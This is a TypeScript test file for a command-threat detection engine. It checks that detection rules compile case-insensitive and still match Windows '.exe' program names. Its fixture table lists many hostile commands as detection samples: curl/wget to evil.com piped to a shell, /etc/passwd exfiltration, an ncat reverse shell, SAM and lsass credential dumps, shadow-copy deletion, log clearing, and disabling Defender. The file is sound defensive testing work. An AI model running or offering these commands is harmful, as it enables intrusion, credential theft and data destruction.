import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";
import { parse as parseYaml } from "yaml";
import type { HeuristicsEngine } from "../heuristics.js";
import { expandMacros, loadThreats } from "../threat-loader.js";
import { createMatcher, loadEngine } from "./test-helper.js";

// Corpus-wide behavioral invariants for the {{CMD_POS}} rule family.
//
// Both invariants below exist because the same class of gap has already
// slipped past manual review multiple times on this corpus: reading a diff
// doesn't reliably catch a regex composed slightly wrong.
// These assert against actual compiled/matched behavior instead of eyeballing
// pattern text, so a future edit that reintroduces either gap fails here.

const matchCommand = createMatcher("command");
const THREATS_DIR = join(import.meta.dirname, "../../../../threats");

describe("threat corpus invariants", () => {
	// --- {{NOT_AFTER_TEXT_CMD}} requires case_insensitive: true ----------
	//
	// The macro's denylist (grep, Select-String, Write-Host, ...) is fixed
	// case. A rule that embeds the macro without `case_insensitive: true`
	// silently stops suppressing case-variant invocations -- e.g.
	// `powershell -Command "select-string -Pattern ..."` (lowercase) bypassed
	// CLT-WIN-CRED-006's suppression while `Select-String` (matching the
	// macro's exact casing) was suppressed. Every current and future
	// consumer of this macro must compile case-insensitive.
	it("every rule using {{NOT_AFTER_TEXT_CMD}} compiles case-insensitive", async () => {
		const macrosRaw = await readFile(join(THREATS_DIR, "_macros.yaml"), "utf8");
		const macros = parseYaml(macrosRaw) as Record<string, string>;
		const expandedGuard = expandMacros(macros.NOT_AFTER_TEXT_CMD, macros);

		const threats = await loadThreats(THREATS_DIR);
		const usingGuard = threats.filter((t) => t.pattern.includes(expandedGuard));

		// Sanity: fail loudly if the macro is ever renamed/removed instead of
		// silently checking zero rules.
		expect(usingGuard.length).toBeGreaterThan(0);

		for (const t of usingGuard) {
			expect(t.compiledPattern.flags, `${t.id} must set case_insensitive: true`).toContain("i");
		}
	});

	// --- Program names with real Windows binaries admit .exe -------------
	//
	// {{NOT_FILENAME}} is `(?![-\w.])`, which rejects a trailing dot, so
	// `{{CMD_POS}}name{{NOT_FILENAME}}` without an optional `(?:\.exe)?`
	// ahead of it can never match `name.exe` -- a real invocation, not an
	// edge case. This exact gap has regressed repeatedly on this corpus:
	// across ~35 rules in one sweep, in three more rules a follow-up fix
	// claimed were already clean, in CLT-MITRE-040 via a mis-composed
	// alternation (`net(?:1|\.exe)?`, which admits `net1` or `net.exe` but
	// never `net1.exe`) that a plain "does it mention .exe" read doesn't
	// catch, in CLT-MITRE-023 (dnscat2/iodine, wrongly assumed Unix-only),
	// and in commands.yaml's curl/wget/powershell rules -- not a
	// Windows-named file, but curl/wget/powershell are just as real on
	// Windows as anywhere else, so "this file doesn't need .exe" was an
	// incomplete read, not a correct scoping call. Not a "Windows files
	// only" concern -- any rule anchoring a program name that ships a real
	// Windows build needs this, regardless of which file it lives in.
	//
	// Each fixture here is an existing, already-verified positive test
	// command for the given rule (mined from the other `*-threats.test.ts`
	// files and validated against that rule's own anchor regex -- see the
	// commit history for this file if the table needs regenerating) whose
	// leading token is a bare program name the rule's pattern already
	// admits a `.exe` suffix for. Mutating that token and re-asserting the
	// same rule still matches turns "does the regex text look right" into
	// "does the engine actually still detect this."
	//
	// Coverage is intentionally partial: rules whose only committed positive
	// test already uses the `.exe` form (or has no exe-anchored positive
	// fixture at all) aren't represented, since hand-writing a new command
	// here would reintroduce the same manual-authoring risk this test exists
	// to avoid.
	//
	// Unlike the case_insensitive check above, this list isn't derived from
	// the corpus automatically, so it can't self-update: when you add
	// `(?:\.exe)?` to a Windows rule's program-name anchor, add a fixture
	// here too (reuse its bare-form positive test command verbatim) so a
	// later edit that breaks the `.exe` form gets caught the same way.
	describe("Windows .exe-suffix invariant", () => {
		let engine: HeuristicsEngine;

		beforeAll(async () => {
			engine = await loadEngine();
		});

		it.each(
			EXE_SUFFIX_FIXTURES,
		)("$ruleId still matches once its program token gets a .exe suffix", ({ ruleId, command }) => {
			// Sanity: the fixture must match as-is, or this test would pass
			// vacuously on a fixture that never worked.
			expect(matchCommand(engine, command)).toContain(ruleId);

			const mutated = command.replace(/^(\S+)/, "$1.exe");
			expect(matchCommand(engine, mutated)).toContain(ruleId);
		});
	});
});

const EXE_SUFFIX_FIXTURES: Array<{ ruleId: string; command: string }> = [
	{ ruleId: "CLT-CMD-001", command: "curl http://evil.com/x.sh | pwsh" },
	{ ruleId: "CLT-CMD-002", command: "wget https://evil.com/script | sh" },
	{ ruleId: "CLT-CMD-010", command: "curl https://evil.com/tool && chmod +x tool" },
	{ ruleId: "CLT-CMD-010", command: "wget https://evil.com/bin && chmod +x bin" },
	{ ruleId: "CLT-CMD-013", command: "curl -d @/etc/passwd https://evil.com/collect" },
	{ ruleId: "CLT-MITRE-002", command: "reg save HKLM\\sam sam" },
	{ ruleId: "CLT-MITRE-005", command: "cmdkey /list" },
	{ ruleId: "CLT-MITRE-007", command: "reg save HKLM\\SAM c:\\temp\\sam" },
	{ ruleId: "CLT-MITRE-012", command: "rar a -dw archive.rar secret/" },
	{ ruleId: "CLT-MITRE-020", command: "netsh start trace" },
	{ ruleId: "CLT-MITRE-022", command: "nmap -sV 192.168.1.0/24" },
	{ ruleId: "CLT-MITRE-023", command: "dnscat2 --secret=abc evil.com" },
	{ ruleId: "CLT-MITRE-023", command: "iodine -f evil.com" },
	{ ruleId: "CLT-MITRE-026", command: "schtasks /create /tn evil /tr cmd.exe /sc daily" },
	{ ruleId: "CLT-MITRE-033", command: "cmd /c del /s /q c:\\evidence" },
	{ ruleId: "CLT-MITRE-034", command: "net use \\\\server\\share /delete" },
	{ ruleId: "CLT-MITRE-037", command: "net user admin /dom" },
	{ ruleId: "CLT-MITRE-040", command: "net user hacker P@ss /add" },
	{ ruleId: "CLT-MITRE-041", command: "certutil -decode payload.b64 evil.exe" },
	{ ruleId: "CLT-MITRE-048", command: "net user backdoor Pass123 /add" },
	{ ruleId: "CLT-MITRE-049", command: "net user newadmin Pass123 /add /domain" },
	{ ruleId: "CLT-MITRE-050", command: "net accounts" },
	{ ruleId: "CLT-MITRE-065", command: "wmic process list /FORMAT:evil.xsl" },
	{ ruleId: "CLT-MITRE-066", command: "nltest /domain_trusts" },
	{ ruleId: "CLT-MITRE-071", command: "tasklist /v | findstr virus" },
	{ ruleId: "CLT-MITRE-072", command: "wmic product get name" },
	{ ruleId: "CLT-MITRE-075", command: "cmd /c assoc .txt=evilhandler" },
	{ ruleId: "CLT-MITRE-083", command: "reg query HKLM /f password /t REG_SZ /s" },
	{ ruleId: "CLT-MITRE-085", command: "certutil -addstore root evil.cer" },
	{ ruleId: "CLT-MITRE-092", command: "7z a -p archive.7z sensitive/" },
	{ ruleId: "CLT-MITRE-093", command: "AUDITPOL /set /category:Detailed Tracking" },
	{ ruleId: "CLT-MITRE-095", command: "wevtutil cl Security" },
	{ ruleId: "CLT-MITRE-096", command: "tscon 2 /dest:rdp-tcp#0" },
	{ ruleId: "CLT-MITRE-102", command: "sc sdset WinDefend D:" },
	{ ruleId: "CLT-MITRE-104", command: "powershell -Class AntiVirusProduct" },
	{ ruleId: "CLT-MITRE-105", command: "powershell Get-SmbShare" },
	{ ruleId: "CLT-WIN-CMD-001", command: "curl https://evil.com/install.ps1 | iex" },
	{ ruleId: "CLT-WIN-CMD-001", command: "wget https://evil.com/install.ps1 | iex" },
	{ ruleId: "CLT-WIN-CMD-007", command: "certutil -decode encoded.b64 payload.exe" },
	{ ruleId: "CLT-WIN-CMD-009", command: "mshta https://evil.com/payload.hta" },
	{ ruleId: "CLT-WIN-CMD-012", command: "cmstp /au /s evil.inf" },
	{ ruleId: "CLT-WIN-CMD-014", command: "msiexec /q /i https://evil.com/pkg.msi" },
	{ ruleId: "CLT-WIN-CMD-016", command: "pcalua -a malware.exe" },
	{ ruleId: "CLT-WIN-CMD-017", command: "installutil /logfile= /logtoconsole=false payload.dll" },
	{ ruleId: "CLT-WIN-CMD-018", command: "regasm /u payload.dll" },
	{ ruleId: "CLT-WIN-CMD-018", command: "regsvcs payload.dll" },
	{ ruleId: "CLT-WIN-CMD-019", command: "format C:" },
	{ ruleId: "CLT-WIN-CMD-020", command: "rd /s /q C:\\" },
	{ ruleId: "CLT-WIN-CMD-021", command: "del /f /s /q C:\\" },
	{ ruleId: "CLT-WIN-CMD-022", command: "diskpart" },
	{ ruleId: "CLT-WIN-CMD-022", command: "diskpart /s wipe.txt" },
	{ ruleId: "CLT-WIN-CMD-025", command: "runas /user:Administrator cmd.exe" },
	{ ruleId: "CLT-WIN-CMD-027", command: "fodhelper" },
	{ ruleId: "CLT-WIN-CMD-030", command: "ncat 10.0.0.1 4444 -e cmd" },
	{ ruleId: "CLT-WIN-CMD-030", command: "ncat 10.0.0.1 4444 -e powershell.exe" },
	{ ruleId: "CLT-WIN-CMD-031", command: "vssadmin Delete Shadows /All" },
	{ ruleId: "CLT-WIN-CMD-031", command: "vssadmin delete shadows /all /quiet" },
	{ ruleId: "CLT-WIN-CMD-032", command: "wmic shadowcopy delete" },
	{ ruleId: "CLT-WIN-CMD-033", command: "bcdedit /set {default} recoveryenabled No" },
	{ ruleId: "CLT-WIN-CMD-033", command: "bcdedit /set bootems off" },
	{ ruleId: "CLT-WIN-CMD-035", command: "wevtutil cl Security" },
	{ ruleId: "CLT-WIN-CMD-035", command: "wevtutil clear-log Application" },
	{ ruleId: "CLT-WIN-CMD-038", command: "net stop MpsSvc" },
	{ ruleId: "CLT-WIN-CMD-038", command: "sc stop WinDefend" },
	{ ruleId: "CLT-WIN-CMD-039", command: "netsh advfirewall set allprofiles state off" },
	{ ruleId: "CLT-WIN-CMD-040", command: "7z a -pMyPassword exfil.7z C:\\secrets" },
	{ ruleId: "CLT-WIN-CMD-040", command: "rar a -pSECRET archive.rar C:\\Users\\docs\\*" },
	{ ruleId: "CLT-WIN-CMD-040", command: "zip --password SECRET archive.zip file.txt" },
	{ ruleId: "CLT-WIN-CMD-041", command: "7z a docs.7z C:\\Users\\*.docx" },
	{ ruleId: "CLT-WIN-CMD-041", command: "rar a spreadsheets.rar D:\\Share\\*.xlsx" },
	{ ruleId: "CLT-WIN-CMD-041", command: "zip reports.zip C:\\Reports\\*.pdf" },
	{ ruleId: "CLT-WIN-CMD-047", command: "wbadmin delete catalog -quiet" },
	{ ruleId: "CLT-WIN-CMD-048", command: "netsh firewall set opmode mode=DISABLE" },
	{ ruleId: "CLT-WIN-CMD-056", command: "powershell iex $env:comspec" },
	{ ruleId: "CLT-WIN-CMD-057", command: "powershell -Version 2 -Command Get-Process" },
	{ ruleId: "CLT-WIN-CMD-059", command: "powershell [Reflection.Assembly]::Load($bytes)" },
	{ ruleId: "CLT-WIN-CRED-001", command: "cmdkey /add:server /user:admin /pass:secret123" },
	{ ruleId: "CLT-WIN-CRED-007", command: "reg save HKLM\\SAM C:\\temp\\sam.hiv" },
	{ ruleId: "CLT-WIN-CRED-007", command: "reg save HKLM\\SECURITY C:\\temp\\security.hiv" },
	{ ruleId: "CLT-WIN-CRED-007", command: "reg save HKLM\\SYSTEM C:\\temp\\system.hiv" },
	{ ruleId: "CLT-WIN-CRED-008", command: "procdump -ma lsass.exe lsassdump.dmp" },
	{ ruleId: "CLT-WIN-CRED-008", command: "procdump64 -ma lsass.exe C:\\temp\\lsass.dmp" },
	{ ruleId: "CLT-WIN-CRED-009", command: "netsh wlan show profiles name=MyWifi key=clear" },
	{ ruleId: "CLT-WIN-CRED-010", command: "xcopy .ssh\\id_rsa C:\\tmp\\" },
	{ ruleId: "CLT-WIN-CRED-010", command: "robocopy . C:\\tmp\\ .aws\\credentials" },
	{ ruleId: "CLT-WIN-OBFUS-002", command: "certutil -decode encoded.b64 output.exe" },
	{ ruleId: "CLT-WIN-OBFUS-009", command: "cscript //E:JScript C:\\ProgramData\\Loader" },
	{ ruleId: "CLT-WIN-OBFUS-013", command: "cmd /c p^o^w^e^r^s^h^e^l^l" },
	{ ruleId: "CLT-WIN-OBFUS-014", command: "cmd /c %comspec:~0,1%%comspec:~4,1%" },
	{ ruleId: "CLT-WIN-OBFUS-015", command: "powershell I`n`v`o`k`e-Expression" },
	{ ruleId: "CLT-WIN-OBFUS-016", command: "powershell $data -bxor 'key'" },
];
